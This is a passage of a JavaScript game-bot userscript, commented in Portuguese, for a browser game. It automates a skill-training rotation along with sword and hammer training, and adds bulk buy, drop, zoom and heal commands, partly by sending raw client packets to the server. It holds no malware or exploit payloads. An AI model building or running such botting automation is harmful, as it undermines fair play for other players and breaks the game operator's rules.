    destru: { x: 124, y: 281 },
  },
};

dsk.rotation = { enabled: false, step: '-', phase: '-' };


// ── Espera chegar na posição exata ────────────────────────────
async function rotMoveTo(x, y, timeout) {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  timeout = timeout || 15000;
  xMovingNow = false;
  await xDelay(100);
  xDoMove(x, y);
  const start = Date.now();
  while (myself.x !== x || myself.y !== y) {
    if (!dsk.rotation.enabled) return;
    if (Date.now() - start > timeout) {
      xMovingNow = false;
      await xDelay(300);
      xDoMove(x, y);
      await xDelay(500);
    }
    await xDelay(200);
  }
}
// ── Liga/Desliga ──────────────────────────────────────────────

dsk.setCmd('/rotation', () => {
  dsk.rotation.enabled = !dsk.rotation.enabled;

  if (!dsk.rotation.enabled) {
    dsk.cooking.enabled  = false;
    dsk.smelting.enabled = false;
    dsk.armas.enabled    = false;
    dsk.destruction.enabled = false;
    xGoing[0]   = false;
    xGoing[1]   = false;
    xGoing[2]   = false;
    xGoing[110] = false;
    xDoKeyUp(6);
    dsk.localMsg('Skill Rotation: Desativado', '#f55');
    return;
  }

  dsk.localMsg('Skill Rotation: Iniciando', '#5f5');
  rotRun();
});

// ── Loop principal ────────────────────────────────────────────

async function rotRun() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  // ── STEP 1: COOK ─────────────────────────────────────────
  if (!rotationConfig.skipCook) {
    dsk.rotation.step  = 'cook';
    dsk.rotation.phase = 'nav';

    dsk.localMsg('Rotation → indo para Cook...', '#0ff');
    await rotMoveTo(rotationConfig.pos.cook.x, rotationConfig.pos.cook.y);

    dsk.rotation.phase = 'bot';
    currentLevel = rotationConfig.cookLevel;
    skillName    = 'cooking';
    cookPositionX = rotationConfig.pos.cook.x;
    cookPositionY = rotationConfig.pos.cook.y;
	skillLevel = 0;
    dsk.cooking.enabled = true;
    dsk.localMsg(`Rotation → Cook até nível ${currentLevel}`, '#5f5');

    (async () => {
      while (dsk.cooking.enabled && dsk.rotation.enabled) {
        await xCook();
        await xDelay(200);
      }
    })();

    while (dsk.cooking.enabled && dsk.rotation.enabled) await xDelay(2000);
    if (!dsk.rotation.enabled) return;

    dsk.rotation.phase = 'cleanup';
    dsk.cooking.enabled = false;
	skillLevel = 0; // ← adiciona isso
    dsk.localMsg('Rotation → Cook pronto! Dropando...', '#ff0');
    await xDelay(500);
    for (const slot of [1, 2, 3]) {
      if (inv[slot - 1]?.sprite) { xDoDropSlot(0, slot); await xDelay(300); }
    }
    await xDelay(500);
  }

  if (!dsk.rotation.enabled) return;

  // ── STEP 2: SMELT ─────────────────────────────────────────
  if (!rotationConfig.skipSmelt) {
    dsk.rotation.step  = 'smelt';
    dsk.rotation.phase = 'nav';

    dsk.localMsg('Rotation → indo para Smelt...', '#0ff');
    await rotMoveTo(rotationConfig.pos.smelt.x, rotationConfig.pos.smelt.y);

    for (const id of [539, 538]) {
      if (xGetSlotByID(id) !== undefined) {
        dsk.localMsg('Rotation → dropando minério pego por engano', '#ff0');
        await xDoDropByID(99, id);
        await xDelay(300);
      }
    }

    dsk.rotation.phase = 'bot';
    currentLevel  = rotationConfig.smeltLevel;
    skillName     = 'smelting';
    smeltPositionX = rotationConfig.pos.smelt.x;
    smeltPositionY = rotationConfig.pos.smelt.y;
	skillLevel = 0;
    dsk.smelting.enabled = true;
    dsk.localMsg(`Rotation → Smelt até nível ${currentLevel}`, '#5f5');

    (async () => {
      while (dsk.smelting.enabled && dsk.rotation.enabled) {
        await xSmelt();
        await xDelay(300);
      }
    })();

    while (dsk.smelting.enabled && dsk.rotation.enabled) await xDelay(2000);
    if (!dsk.rotation.enabled) return;

    dsk.rotation.phase = 'cleanup';
    dsk.smelting.enabled = false;
	skillLevel = 0; // ← adiciona isso
    dsk.localMsg('Rotation → Smelt pronto! Dropando...', '#ff0');
    await xDelay(500);
    for (const slot of [1, 2, 3, 4, 5, 6]) {
      if (inv[slot - 1]?.sprite) { xDoDropSlot(0, slot); await xDelay(300); }
    }
    await xDelay(500);
  }

  if (!dsk.rotation.enabled) return;

  // ── STEP 3: SWORD ─────────────────────────────────────────
  if (!rotationConfig.skipSword) {
    dsk.rotation.step  = 'sword';
    dsk.rotation.phase = 'nav';

    dsk.localMsg('Rotation → indo buscar espada...', '#0ff');
    await rotMoveTo(rotationConfig.pos.sword.x, rotationConfig.pos.sword.y);
    await xDelay(400);
    await xDoPickUp();
    await xDelay(400);
    if (inv[0]?.sprite && inv[0].equip === 0) { await xDoUseSlot(0); await xDelay(500); }
    await xDoChangeDir(0);
    await xDelay(500);

    dsk.rotation.phase = 'bot';
    currentLevel = rotationConfig.swordLevel;
    skillName    = 'sword';
	skillLevel = 0; // ← adiciona isso
    dsk.sword.enabled = true;
    dsk.localMsg(`Rotation → Sword até nível ${currentLevel}`, '#5f5');

    (async () => {
      while (dsk.sword.enabled && dsk.rotation.enabled) {
        await Sword();
        await xDelay(500);
      }
    })();

    while (dsk.sword.enabled && dsk.rotation.enabled) await xDelay(2000);
    if (!dsk.rotation.enabled) return;

    dsk.rotation.phase = 'cleanup';
    dsk.sword.enabled = false;
	skillLevel = 0; // ← adiciona isso
    xDoKeyUp(6);
    await xDelay(400);
    await xDoDropSlot(1, 1);
    await xDelay(500);
  }

  if (!dsk.rotation.enabled) return;

  // ── STEP 4: HAMMER ─────────────────────────────────────────
  if (!rotationConfig.skipHammer) {
    dsk.rotation.step  = 'hammer';
    dsk.rotation.phase = 'nav';

    dsk.localMsg('Rotation → indo buscar martelo...', '#0ff');
    await rotMoveTo(rotationConfig.pos.hammer.x, rotationConfig.pos.hammer.y);
    await xDelay(400);
    await xDoPickUp();
    await xDelay(400);
    if (inv[0]?.sprite && inv[0].equip === 0) { await xDoUseSlot(0); await xDelay(500); }
    await xDoChangeDir(0);
    await xDelay(500);

    dsk.rotation.phase = 'bot';
    currentLevel = rotationConfig.hammerLevel;
    skillName    = 'hammer';
	skillLevel = 0; // ← adiciona isso
    dsk.hammer.enabled = true;
    dsk.localMsg(`Rotation → Hammer até nível ${currentLevel}`, '#5f5');

    (async () => {
      while (dsk.hammer.enabled && dsk.rotation.enabled) {
        await Hammer();
        await xDelay(500);
      }
    })();

    while (dsk.hammer.enabled && dsk.rotation.enabled) await xDelay(2000);
    if (!dsk.rotation.enabled) return;

    dsk.rotation.phase = 'cleanup';
    dsk.hammer.enabled = false;
	skillLevel = 0; // ← adiciona isso
    xDoKeyUp(6);
	await xDelay(500);
	await xDoDropSlot(1, 1);
    await xDelay(500);
  }

  if (!dsk.rotation.enabled) return;

  // ── STEP 5: ARMAS ─────────────────────────────────────────
  if (!rotationConfig.skipArmas) {
    dsk.rotation.step  = 'armas';
    dsk.rotation.phase = 'nav';

    dsk.localMsg('Rotation → indo buscar armas...', '#0ff');
    await rotMoveTo(rotationConfig.pos.armasPick.x, rotationConfig.pos.armasPick.y);
    for (let p = 0; p < 6; p++) { await xDoPickUp(); await xDelay(200); }
    if (inv[0]?.sprite && inv[0].equip === 0) { await xDoUseSlot(0); await xDelay(500); }
    await rotMoveTo(rotationConfig.pos.armas.x, rotationConfig.pos.armas.y);
    await xDelay(500);
    await xDoChangeDir(0);
    await xDelay(500);

    dsk.rotation.phase = 'bot';
    currentLevel = rotationConfig.armasLevel;
	skillLevel = 0;
    dsk.armas.enabled = true;
    dsk.localMsg(`Rotation → Armas até nível ${currentLevel}`, '#5f5');

    (async () => {
      while (dsk.armas.enabled && dsk.rotation.enabled) {
        await Armas();
        await xDelay(1500);
      }
    })();

    while (dsk.armas.enabled && dsk.rotation.enabled) {
	  if (inv[0]?.sprite === 687) {
		dsk.armas.enabled = false;
	  }
	  await xDelay(2000);
	}
    if (!dsk.rotation.enabled) return;

    dsk.rotation.phase = 'cleanup';
    dsk.armas.enabled = false;
	skillLevel = 0; // ← adiciona isso
    xDoKeyUp(6);
    await xDelay(500);
    dsk.localMsg('Rotation → Armas pronto! Dropando slots...', '#ff0');
    for (const slot of [1, 2, 3, 4, 5, 6]) {
      if (inv[slot - 1]?.sprite) { xDoDropSlot(0, slot); await xDelay(300); }
    }
    await xDelay(500);
  }

  if (!dsk.rotation.enabled) return;

  // ── STEP 6: DESTRUCTION ───────────────────────────────────
  if (!rotationConfig.skipDestru) {
    dsk.rotation.step  = 'destru';
    dsk.rotation.phase = 'nav';

    await rotMoveTo(rotationConfig.pos.destru.x, rotationConfig.pos.destru.y);
    await xDelay(400);
    await xDoPickUp();
    await xDelay(400);

    if (inv[0]?.sprite && inv[0].equip === 0) {
      await xDoUseSlot(0);
      await xDelay(500);
    }

    _originalSend({ type: 'chat', data: '/pvp' });
	await xDelay(800); // ← espera o servidor responder

	if (xIfChatHas("PVP Off")) {
	  await xDoClearChat("PVP Off");
	  await xDelay(300);
	  _originalSend({ type: 'chat', data: '/pvp' }); // ← manda de novo pra ligar
	  await xDelay(500);
	}
    await xDelay(500);

    destructPosX = rotationConfig.pos.destru.x;
    destructPosY = rotationConfig.pos.destru.y;

    dsk.rotation.phase = 'bot';
    skillName    = 'destruction';
	currentLevel = rotationConfig.destruLevel;
	skillLevel = 0;
	dsk.destruction.enabled = true;
    dsk.localMsg(`Rotation → Destruction até nível ${currentLevel}`, '#5f5');

    (async () => {
      while (dsk.destruction.enabled && dsk.rotation.enabled) {
        await Destruction();
        await xDelay(200);
      }
    })();

    while (dsk.destruction.enabled && dsk.rotation.enabled) await xDelay(2000);
    if (!dsk.rotation.enabled) return;

    dsk.rotation.phase = 'cleanup';
    dsk.destruction.enabled = false;
    xDoKeyUp(6);
    await xDelay(500);
  }

  // ── FIM DO CICLO ──────────────────────────────────────────
  if (!dsk.rotation.enabled) return;
  dsk.localMsg('✅ Rotation: ciclo completo!', '#5f5');
  dsk.rotation.step  = '-';
  dsk.rotation.phase = '-';
  await xDelay(3000);
}

// ── Config Panel ──────────────────────────────────────────────

dsk.rotManager = jv.Dialog.create(250, 416);
const rm = dsk.rotManager;
rm.visible = false;

rm.header = jv.text('Skill Rotation Config', {
  font: '13px Verdana', fill: 0xFFD700, stroke: 0x555555, strokeThickness: 2,
});
rm.addChild(rm.header);
jv.center(rm.header);
jv.top(rm.header, 4);

rm.close = jv.Button.create(0, 0, 24, 'X', rm, 24);
jv.top(rm.close, 4); jv.right(rm.close, 4);
rm.close.on_click = () => (rm.visible = 0);

rm.move = jv.Button.create(0, 0, 24, '@', rm, 24);
jv.top(rm.move, 4); jv.right(rm.move, 28);

rm._px = 0; rm._py = 0;
window.addEventListener('mousemove', e => { rm._px = e.clientX; rm._py = e.clientY; });
window.addEventListener('touchmove', e => { rm._px = e.touches[0].clientX; rm._py = e.touches[0].clientY; });

dsk.on('postLoop', () => {
  if (!rm.move?.is_pressed) {
    rm.x = Math.max(0, Math.min(rm.x, jv.game_width  - rm.w));
    rm.y = Math.max(0, Math.min(rm.y, jv.game_height - rm.h));
    return;
  }
  const canvas = document.querySelector('canvas');
  const rect = canvas ? canvas.getBoundingClientRect() : { left:0, top:0, width:jv.game_width, height:jv.game_height };
  rm.x = (rm._px - rect.left) * (jv.game_width / rect.width) - rm.w / 2;
  rm.y = (rm._py - rect.top) * (jv.game_height / rect.height) - 12;
});

// Cabeçalhos
['Step', 'Nível', 'Skip'].forEach((t, xi) => {
  const l = jv.text(t, { font: '10px Verdana', fill: 0xaaaaaa });
  l.x = [10, 140, 212][xi]; l.y = 30; rm.addChild(l);
});

// Rows
function rmRow(label, y, cfgKey, skipKey) {
  const lbl = jv.text(label, { font: '10px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2 });
  lbl.x = 10; lbl.y = y; rm.addChild(lbl);

  const btnM = jv.Button.create(130, y - 4, 22, '-', rm, 20);
  const val  = jv.text(String(rotationConfig[cfgKey]), { font: '12px Verdana', fill: 0xFFD700, stroke: 0x000000, strokeThickness: 2 });
  val.x = 158; val.y = y; rm.addChild(val);
  const btnP = jv.Button.create(178, y - 4, 22, '+', rm, 20);

  btnM.on_click = () => { rotationConfig[cfgKey] = Math.max(1,   rotationConfig[cfgKey] - 1); val.text = String(rotationConfig[cfgKey]); };
  btnP.on_click = () => { rotationConfig[cfgKey] = Math.min(200, rotationConfig[cfgKey] + 1); val.text = String(rotationConfig[cfgKey]); };

  const btnSkip = jv.Button.create(206, y - 4, 34, rotationConfig[skipKey] ? 'SKIP' : 'ON', rm, 20);
  btnSkip.on_click = () => {
    rotationConfig[skipKey] = !rotationConfig[skipKey];
    btnSkip.title.text = rotationConfig[skipKey] ? 'SKIP' : 'ON';
  };
  return val;
}

const valCook   = rmRow('Cook',   48,  'cookLevel',   'skipCook');
const valSmelt  = rmRow('Smelt',  70,  'smeltLevel',  'skipSmelt');
const valSword  = rmRow('Sword',  92,  'swordLevel',  'skipSword');
const valHammer = rmRow('Hammer', 114, 'hammerLevel', 'skipHammer');
const valArmas  = rmRow('Armas',  136, 'armasLevel',  'skipArmas');
const valDestru = rmRow('Destru', 158, 'destruLevel', 'skipDestru');

// Status ao vivo
function rmLbl(txt, y) {
  const l = jv.text(txt, { font: '11px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2 });
  l.x = 10; l.y = y; rm.addChild(l); return l;
}

const lblStep  = rmLbl('Step: -',  180);
const lblPhase = rmLbl('Fase: -',  195);
const lblSkill = rmLbl('Skill: -', 210);
const lblNivel = rmLbl('Nível: -', 225);
const lblAlvo  = rmLbl('Alvo: -',  240);
const lblOn    = rmLbl('○ OFF',    255);

dsk.on('postLoop', () => {
  if (!rm.visible) return;
  const r = dsk.rotation;
	const alvoMap = {
	  cook:   'cookLevel',
	  smelt:  'smeltLevel',
	  sword:  'swordLevel',
	  hammer: 'hammerLevel',
	  armas:  'armasLevel',
	  destru: 'destruLevel',
	};  
  lblStep.text  = `Step: ${r.step}`;
  lblPhase.text = `Fase: ${r.phase}`;
  lblSkill.text = `Skill: ${skillName ?? '-'}`;
  lblNivel.text = `Nível: ${skillLevel ?? '-'}`;
  lblAlvo.text  = `Alvo: ${rotationConfig[alvoMap[r.step]] ?? '-'}`;
  lblOn.text    = r.enabled ? '● ON' : '○ OFF';
  lblOn.style.fill = r.enabled ? 0x44ff44 : 0xff4444;
});



// ── Seção de posições ─────────────────────────────────────────
const rmPosLbl = jv.text('── Posições (clique para capturar) ──', {
  font: '9px Verdana', fill: 0xaaaaaa, stroke: 0x000000, strokeThickness: 2,
});
rmPosLbl.x = 10; rmPosLbl.y = 270;
rm.addChild(rmPosLbl);

const rmPosSteps = [
  { key: 'cook',      label: 'Cook'      },
  { key: 'smelt',     label: 'Smelt'     },
  { key: 'sword',     label: 'Sword'     },
  { key: 'hammer',    label: 'Hammer'    },
  { key: 'armasPick', label: 'Armas Pick' },
  { key: 'armas',     label: 'Armas Luta' },
  { key: 'destru',    label: 'Destru'    },
];

rm.posLabels = {};

rmPosSteps.forEach(({ key, label }, i) => {
  const col = i % 2;       // 0 = esquerda, 1 = direita
  const row = Math.floor(i / 2);
  const bx  = col === 0 ? 4 : 126;
  const by  = 282 + row * 26;

  const btn = jv.Button.create(bx, by, 118, '', rm, 20);

  const lbl = jv.text(`${label}: (${rotationConfig.pos[key].x},${rotationConfig.pos[key].y})`, {
    font: '9px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2,
  });
  lbl.x = 4; lbl.y = 4;
  btn.addChild(lbl);
  rm.posLabels[key] = lbl;

  btn.on_click = () => {
    if (!myself) return;
    rotationConfig.pos[key].x = myself.x;
    rotationConfig.pos[key].y = myself.y;
    lbl.text = `${label}: (${myself.x},${myself.y})`;
    dsk.localMsg(`Rotation: ${label} → (${myself.x},${myself.y})`, '#0ff');
    // Salva no localStorage
    try {
      localStorage.setItem('dsk_rotation_pos', JSON.stringify(rotationConfig.pos));
    } catch(e) {}
  };
});

// Botão para resetar posições para o padrão
const btnResetPos = jv.Button.create(10, 386, 230, '↺ Resetar Posições', rm, 20);
btnResetPos.on_click = () => {
  rotationConfig.pos = {
    cook:     { x: 112, y: 278 },
    smelt:    { x: 112, y: 275 },
    sword:    { x: 115, y: 279 },
    hammer:   { x: 119, y: 280 },
    armas:    { x: 114, y: 280 },
    armasPick:{ x: 117, y: 280 },
    destru:   { x: 124, y: 281 },
  };
  try { localStorage.removeItem('dsk_rotation_pos'); } catch(e) {}
  // Atualiza labels
  rmPosSteps.forEach(({ key, label }) => {
    rm.posLabels[key].text = `${label}: (${rotationConfig.pos[key].x},${rotationConfig.pos[key].y})`;
  });
  dsk.localMsg('Rotation: posições resetadas para padrão', '#ff0');
};

// Carrega posições salvas ao iniciar
try {
  const saved = JSON.parse(localStorage.getItem('dsk_rotation_pos') || '{}');
  Object.keys(saved).forEach(k => {
    if (rotationConfig.pos[k]) {
      rotationConfig.pos[k] = saved[k];
    }
  });
} catch(e) {}

dsk.setCmd('/rotationconfig', () => {
  rm.visible = !rm.visible;
  dsk.localMsg(`Rotation Config: ${rm.visible ? 'Aberto' : 'Fechado'}`, rm.visible ? '#5f5' : '#f55');
});

//botao emergencia reset//

dsk.setCmd('/reset', () => {
  jv.key_array[6].isDown = false;
  jv.key_array[6].isUP = true;
  xMovingNow = false;
  Object.keys(xGoing).forEach(k => xGoing[k] = false);
  dsk.localMsg('Reset completo', '#ff0');
});

// ── HAMMER BOT ─────────────────────────────────────────────────

dsk.hammer = { enabled: false, repairing: false };

async function Hammer() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;

  if (currentLevel > 0 && skillLevel >= currentLevel && skillName == 'hammer') {
    await xDoKeyUp(6);
    dsk.hammer.enabled = false;
    dsk.localMsg('Hammer Bot: Desativado', '#f55');
    return;
  }

  if (xGoing[113] === true) return;
  xGoing[113] = true;

  if (inv[0].sprite === 719) {
    // ── COM REPAIR KIT ──────────────────────────────

    if (inv[0].equip === 2) {

      if (dsk.hammer.repairingTarget === 'dummy') {
		await xDoKeyUp(6);
		await xDelay(520);
        await xDoMove(myself.x, myself.y + 3);
        await xDelay(700);
        await xDoDropSlot(1, 1);
        await xDelay(500);
        await xDoMove(myself.x, myself.y - 1);
        await xDelay(700);
        await xDoPickUp();
        await xDelay(300);
        await xDoUseSlot(0);
        await xDelay(500);
        await xDoMove(myself.x, myself.y - 2);
        await xDelay(500);

      } else {
		await xDoKeyUp(6);
		await xDelay(520);
        await xDoMove(myself.x, myself.y + 2);
        await xDelay(800);
        await xDoDropSlot(1, 1);
        await xDelay(500);
        await xDoMove(myself.x, myself.y - 1);
        await xDelay(800);
        await xDoPickUp();
        await xDelay(300);
        await xDoUseSlot(0);
        await xDelay(500);
        await xDoChangeDir(0);
        await xDelay(300);
      }

      dsk.hammer.repairingTarget = null;
      xGoing[113] = false;
      return;
    }
	await xDoKeyPress(6, 214);
	await xDelay(523);

    if (xIfChatHas("is in perfect condition")) {
      xDoClearChat("is in perfect condition");
      dsk.hammer.repairing = false;
	  await xDoKeyUp(6);
	  await xDelay(512);
      await xDoMove(myself.x, myself.y - 2);
      await xDelay(620);

      await xDoChangeDir(0);
	  await xDelay(418);
      await xDoKeyPress(6, 181); await xDelay(510);
      while (xGetWallHp(myself.x, myself.y - 1) < 90 && xGetWallHp(myself.x, myself.y - 1) !== -1) {
        await xDoKeyPress(6, 180);
        await xDelay(530);
      }

      await xDoChangeDir(1);
	  await xDelay(422);
      await xDoKeyPress(6, 182); await xDelay(510);
      while (xGetWallHp(myself.x + 1, myself.y) < 90 && xGetWallHp(myself.x + 1, myself.y) !== -1) {
        await xDoKeyPress(6, 183);
        await xDelay(531);
      }

      await xDoChangeDir(3);
	  await xDelay(412);
      await xDoKeyPress(6, 181); await xDelay(523);
      while (xGetWallHp(myself.x - 1, myself.y) < 90 && xGetWallHp(myself.x - 1, myself.y) !== -1) {
        await xDoKeyPress(6, 182);
        await xDelay(521);
      }
	  await xDelay(614);
      await xDoMove(myself.x, myself.y + 2);
      await xDelay(610);
      await xDoDropSlot(1, 1);
      await xDelay(634);

      await xDoMove(myself.x, myself.y - 1);
      await xDelay(614);
      await xDoPickUp();
      await xDelay(511);
      await xDoUseSlot(0);
      await xDelay(512);
      await xDoChangeDir(0);
	  await xDelay(520);

    } else if (dsk.hammer.repairing) {
      xGoing[113] = false;
      return;
    }

  } else {
    // ── COM MARTELO ──────────────────────────────────

    if (inv[0].equip === 0) {
      await xDoUseSlot(0);
      await xDelay(500);
    }

    const wN = xGetWallByPos(myself.x,     myself.y - 2);
    const wW = xGetWallByPos(myself.x - 1, myself.y - 1);
    const wE = xGetWallByPos(myself.x + 1, myself.y - 1);

    if (wN?.hpbar?.val <= 250 || wW?.hpbar?.val <= 250 || wE?.hpbar?.val <= 250) {
      dsk.hammer.repairing = true;
      dsk.hammer.repairingTarget = 'dummy'; // ← novo

      await xDoDropSlot(1, 1);
      await xDelay(645);

      await xDoMove(myself.x, myself.y + 1);
      await xDelay(515);
      await xDoPickUp();
      await xDelay(545);

      await xDoChangeDir(0);
	  await xDelay(519);
      await xDoUseSlot(0);
      await xDelay(531);

      xGoing[113] = false;
      return;
    }

    if (inv[0].equip === 2) {
      dsk.hammer.repairing = true;
      dsk.hammer.repairingTarget = 'arma'; // ← novo

	  await xDelay(456);
	  await xDoKeyUp(6);
	  await xDelay(325);
      await xDoDropSlot(1, 1);
      await xDelay(624);

      await xDoMove(myself.x, myself.y + 1);
      await xDelay(510);
      await xDoPickUp();
      await xDelay(515);

      await xDoChangeDir(0);
	  await xDelay(515);
      await xDoUseSlot(0);
      await xDelay(516);

      xGoing[113] = false;
      return;
    }

    if (!keySpace.isDown && inv[0].sprite !== undefined && inv[0].equip === 1) {
      await xDoKeyDown(6);
      await xDelay(800);
    }
  }

  xGoing[113] = false;
}

dsk.setCmd('/hammer', () => {
  dsk.hammer.enabled = !dsk.hammer.enabled;

  if (dsk.hammer.enabled) {
    dsk.hammer.repairing = false;
    dsk.localMsg('Hammer Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.hammer.enabled) {
        await Hammer();
        await xDelay(500);
      }
    })();
  } else {
    xGoing[113] = false;
    xDoKeyUp(6);
    dsk.hammer.repairing = false;
    dsk.localMsg('Hammer Bot: Desativado', '#f55');
  }
});

// ── SWORD BOT ─────────────────────────────────────────────────

dsk.sword = {
  enabled: false,
  repairing: false,
  repairingTarget: null, // 'dummy' | 'arma' | null
};

async function Sword() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;

  if (currentLevel > 0 && skillLevel >= currentLevel && skillName == 'sword') {
    await xDoKeyUp(6);
    dsk.sword.enabled = false;
    dsk.localMsg('Sword Bot: Desativado', '#f55');
    return;
  }

  if (xGoing[112] === true) return;
  xGoing[112] = true;

  if (inv[0].sprite === 719) {
    // ── COM REPAIR KIT ──────────────────────────────

    if (inv[0].equip === 2) {

      if (dsk.sword.repairingTarget === 'dummy') {
		await xDoKeyUp(6);
		await xDelay(510);
        await xDoMove(myself.x, myself.y + 2);
        await xDelay(520);
        await xDoDropSlot(1, 1);
        await xDelay(612);
        await xDoMove(myself.x, myself.y - 1);
        await xDelay(523);
        await xDoPickUp();
        await xDelay(420);
        await xDoUseSlot(0);
        await xDelay(610);
        await xDoMove(myself.x, myself.y - 1);
        await xDelay(550);

      } else {
		await xDoKeyUp(6);
		await xDelay(632);
        await xDoMove(myself.x, myself.y + 2);
        await xDelay(530);
        await xDoDropSlot(1, 1);
        await xDelay(612);
        await xDoMove(myself.x, myself.y - 1);
        await xDelay(530);
        await xDoPickUp();
        await xDelay(410);
        await xDoUseSlot(0);
        await xDelay(513);
        await xDoChangeDir(0);
        await xDelay(410);
      }

      dsk.sword.repairingTarget = null;
      xGoing[112] = false;
      return;
    }
	await xDelay(532);
	await xDoKeyPress(6, 231);

    if (xIfChatHas("is in perfect condition")) {
      xDoClearChat("is in perfect condition");
      dsk.sword.repairing = false;

	  await xDelay(425);
      await xDoMove(myself.x, myself.y - 1);
      await xDelay(600);

      await xDoChangeDir(0);
	  await xDelay(550);
      await xDoKeyPress(6, 184); await xDelay(550);
      while (xGetWallHp(myself.x, myself.y - 1) < 90 && xGetWallHp(myself.x, myself.y - 1) !== -1) {
        await xDoKeyPress(6, 185);
        await xDelay(515);
      }

      await xDoChangeDir(1);
	  await xDelay(560);
      await xDoKeyPress(6, 180); await xDelay(550);
      while (xGetWallHp(myself.x + 1, myself.y) < 90 && xGetWallHp(myself.x + 1, myself.y) !== -1) {
        await xDoKeyPress(6, 186);
        await xDelay(518);
      }

      await xDoChangeDir(3);
	  await xDelay(555);
      await xDoKeyPress(6, 183); await xDelay(550);
      while (xGetWallHp(myself.x - 1, myself.y) < 90 && xGetWallHp(myself.x - 1, myself.y) !== -1) {
        await xDoKeyPress(6, 187);
        await xDelay(514);
      }
	  await xDelay(623);
      await xDoMove(myself.x, myself.y + 1);
      await xDelay(610);
      await xDoDropSlot(1, 1);
      await xDelay(420);

      await xDoMove(myself.x, myself.y - 1);
      await xDelay(530);
      await xDoPickUp();
      await xDelay(431);
      await xDoUseSlot(0);
      await xDelay(540);
      await xDoChangeDir(0);
	  await xDelay(520);

    } else if (dsk.sword.repairing) {
      xGoing[112] = false;
      return;
    }

  } else {
    // ── COM SWORD ──────────────────────────────────

    if (inv[0].equip === 0) {
      await xDoUseSlot(0);
      await xDelay(520);
    }

    if (xGetWallHp(myself.x, myself.y - 1) <= 25 && xGetWallHp(myself.x, myself.y - 1) !== -1) {
      dsk.sword.repairing = true;
      dsk.sword.repairingTarget = 'dummy'; // ← novo
	  await xDoKeyUp(6);
	  await xDelay(429);
      await xDoDropSlot(1, 1);
      await xDelay(535);

      await xDoMove(myself.x, myself.y + 1);
      await xDelay(510);
      await xDoPickUp();
      await xDelay(420);

      await xDoChangeDir(0);
	  await xDelay(310);
      await xDoUseSlot(0);
      await xDelay(530);

      xGoing[112] = false;
      return;
    }

    if (inv[0].equip === 2) {
      dsk.sword.repairing = true;
      dsk.sword.repairingTarget = 'arma'; // ← novo
	  await xDoKeyUp(6);
	  await xDelay(425);

      await xDoDropSlot(1, 1);
      await xDelay(530);

      await xDoMove(myself.x, myself.y + 1);
      await xDelay(530);
      await xDoPickUp();
      await xDelay(440);

      await xDoChangeDir(0);
	  await xDelay(315);
      await xDoUseSlot(0);
      await xDelay(520);

      xGoing[112] = false;
      return;
    }

    if (!keySpace.isDown && inv[0].sprite !== undefined && inv[0].equip === 1) {
      await xDoKeyDown(6);
      await xDelay(800);
    }
  }

  xGoing[112] = false;
}

dsk.setCmd('/sword', () => {
  dsk.sword.enabled = !dsk.sword.enabled;

  if (dsk.sword.enabled) {
    dsk.sword.repairing = false;
    dsk.localMsg('Sword Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.sword.enabled) {
        await Sword();
        await xDelay(500);
      }
    })();
  } else {
    xGoing[112] = false;
    xDoKeyUp(6);
    dsk.sword.repairing = false;
    dsk.localMsg('Sword Bot: Desativado', '#f55');
  }
});

dsk.setCmd('/buy', async (context) => {
    const amount = parseInt(context);
    
    if (isNaN(amount) || amount <= 0) {
        dsk.localMsg('Uso: /buy <quantidade> (ex: /buy 20)', '#ff0');
        return;
    }
    
    if (jv.dialog_counter == undefined) {
        dsk.localMsg('Buy: nenhum dialogo aberto!', '#f55');
        return;
    }
    
    dsk.localMsg(`Buy: comprando ${amount}x...`, '#0ff');
    
    for (let i = 0; i < amount; i++) {
        send({ type: 'c', r: 'bc', t: jv.dialog_counter.txid });
        await xDelay(210);
    }
    
    dsk.localMsg(`Buy: ${amount}x concluido!`, '#5f5');
});

//dropar paginas

dsk.setCmd('/dropar', async (context) => {
    const amount = parseInt(context);
    
    if (isNaN(amount) || amount <= 0) {
        dsk.localMsg('Uso: /dropar <quantidade> (ex: /dropar 40)', '#ff0');
        return;
    }
    
    dsk.localMsg(`Dropar: dropando ${amount} item(s)...`, '#0ff');
    
    for (let i = 0; i < amount; i++) {
        await xDelay(150);
        send({
            type: "d",
            slot: i + item_page * item_length,
            amt: 1000000
        });
    }
    
    dsk.localMsg(`Dropar: ${amount} item(s) concluido!`, '#5f5');
});
//zoom

dsk.zoom = { enabled: false };

dsk.setCmd('/zoom', () => {
    dsk.zoom.enabled = !dsk.zoom.enabled;
    
    const xZoom = dsk.zoom.enabled ? 1.5 : 1.0;

    // Pega o sprite correto independente da conta
    const rootSprite = myself.body_sprite ?? myself.spr;
    const world = rootSprite.parent.parent.parent;
    
    // Escala o mundo do jogo
    world.scale.x = (1 / xZoom);
    world.scale.y = (1 / xZoom);
    world.position.x = 380 * (1 - (1 / xZoom));
    world.position.y = 230 * (1 - (1 / xZoom));

    // Escala o UI
    ui_container.scale.x = 1 / (1 / xZoom);
    ui_container.scale.y = 1 / (1 / xZoom);
    ui_container.position.x = (xZoom - 1) * -380;
    ui_container.position.y = (xZoom - 1) * -230;

    // Contra-escala da skill bar (dinâmico)
    const skillBar = jv.stage.children.find(c =>
        c !== ui_container &&
        c.children?.length >= 5 &&
        c.children?.some(child => child.y >= 350 && child.y <= 400)
    );
    if (skillBar) {
        skillBar.scale.x = xZoom;
        skillBar.scale.y = xZoom;
        skillBar.x = -380 * (xZoom - 1);
        skillBar.y = -230 * (xZoom - 1);
    }
    
    dsk.localMsg(`Zoom: ${dsk.zoom.enabled ? '1.5x (ativado)' : '1.0x (desativado)'}`, dsk.zoom.enabled ? '#5f5' : '#f55');
});


//heal bot //

dsk.healbot = { enabled: false };

dsk.setCmd('/healbot', () => {
  dsk.healbot.enabled = !dsk.healbot.enabled;

  if (dsk.healbot.enabled) {
    dsk.localMsg('HealBot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.healbot.enabled) {
        await HealBot();
        await xDelay(500);
      }
    })();
  } else {
    xGoing[115] = false;
    xDoKeyUp(6);
    dsk.localMsg('HealBot: Desativado', '#f55');
  }
});

